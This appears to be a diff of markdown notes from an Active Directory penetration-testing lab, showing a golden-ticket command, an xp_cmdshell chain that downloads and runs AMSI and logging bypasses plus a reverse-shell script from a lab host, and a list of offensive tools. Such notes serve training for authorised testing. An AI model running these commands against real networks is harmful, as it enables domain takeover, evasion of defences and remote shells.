@@ -272,3 +272,26 @@ Invoke-Mimi -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.m
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.116/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.116/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.116/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql15
 ````
+
+## ![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&duration=6000&pause=1000&width=435&lines=Tools)
+
+- adPEAS.ps1
+- BloodHound-4.O.3_old.zip
+- Find-PSRemotingLocalAdminAccess.ps1
+- hfs.exe
+- InviShell
+- Nmap-7.92
+- Invoke-Mimi.ps1
+- Invoke-PowerShellTcp.ps1
+- Invoke-SessionHunter.ps1
+- Invoke-SQLOSCmd.ps1
+- SharpUp.exe
+- PowerUp.ps1
+- PowerUpSQL-master.zip
+- PowerView.ps1
+- Rubeus.exe
+- sbloggingbypass.txt
+- SharpHound.exe
+- SharpHound.ps1
+- nc64.exe
+- NetExec.exe
